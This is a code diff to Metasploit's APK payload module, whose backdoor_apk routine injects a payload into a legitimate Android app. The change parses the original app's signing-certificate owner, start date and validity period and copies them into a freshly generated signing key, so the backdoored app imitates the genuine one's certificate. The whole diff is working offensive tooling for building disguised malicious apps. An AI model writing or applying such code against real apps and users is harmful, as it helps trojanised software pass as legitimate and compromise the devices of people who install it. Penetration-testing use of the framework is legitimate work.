@@ -7,6 +7,7 @@ require 'nokogiri'
 require 'fileutils'
 require 'optparse'
 require 'open3'
+require 'date'
 
 class Msf::Payload::Apk
 
@@ -95,20 +96,21 @@ class Msf::Payload::Apk
     File.open("#{tempdir}/original/AndroidManifest.xml", "wb") {|file| file.puts original_manifest.to_xml }
   end
 
-  def find_orig_cert_dname(orig_apkfile)
-    unzip_output = run_cmd("unzip -l #{orig_apkfile}")
-    orig_cert_file = unzip_output.match(/[\w\/-]+\.RSA/)[0]
-    bin_cert_data, err, s = Open3.capture3("unzip -p #{orig_apkfile} #{orig_cert_file}")
-    unless s.success?
-      raise RuntimeError, "Failed to find original cert data."
-    end
-    keytool_output, err, s = Open3.capture3("keytool -printcert", :stdin_data=>bin_cert_data, :binmode=>true)
-    unless s.success?
-      raise RuntimeError, "Failed to print cert data via keytool."
-    end
-    owner_line = keytool_output.lines.first.chomp
+  def parse_orig_cert_data(orig_apkfile)
+    orig_cert_data = Array[]
+    keytool_output = run_cmd("keytool -printcert -jarfile #{orig_apkfile}")
+    owner_line = keytool_output.match(/^Owner:.+/)[0]
     orig_cert_dname = owner_line.gsub(/^.*:/, '').strip
-    return orig_cert_dname
+    orig_cert_data.push("#{orig_cert_dname}")
+    valid_from_line = keytool_output.match(/^Valid from:.+/)[0]
+    from_date_str = valid_from_line.gsub(/^Valid from:/, '').gsub(/until:.+/, '').strip
+    to_date_str = valid_from_line.gsub(/^Valid from:.+until:/, '').strip
+    from_date = DateTime.parse("#{from_date_str}")
+    orig_cert_data.push(from_date.strftime("%Y/%m/%d %T"))
+    to_date = DateTime.parse("#{to_date_str}")
+    validity = (to_date - from_date).to_i
+    orig_cert_data.push("#{validity}")
+    return orig_cert_data
   end
 
   def backdoor_apk(apkfile, raw_payload)
@@ -125,11 +127,6 @@ class Msf::Payload::Apk
     jarsigner = run_cmd("jarsigner")
     unless jarsigner != nil
       raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
-    end
-
-    unzip = run_cmd("unzip")
-    unless unzip != nil
-      raise RuntimeError, "unzip not found. If it's not in your PATH, please add it."
     end
 
     zipalign = run_cmd("zipalign")
@@ -154,12 +151,16 @@ class Msf::Payload::Apk
     storepass = "android"
     keypass = "android"
     keyalias = "signing.key"
-    orig_cert_dname = find_orig_cert_dname(apkfile)
+    orig_cert_data = parse_orig_cert_data(apkfile)
+    orig_cert_dname = orig_cert_data[0]
+    orig_cert_startdate = orig_cert_data[1]
+    orig_cert_validity = orig_cert_data[2]
 
     print_status "Creating signing key and keystore..\n"
     run_cmd("keytool -genkey -v -keystore #{keystore} \
     -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
-    -keysize 2048 -validity 10000 -dname '#{orig_cert_dname}'")
+    -keysize 2048 -startdate '#{orig_cert_startdate}' \
+    -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'")
 
     File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
     FileUtils.cp apkfile, "#{tempdir}/original.apk"
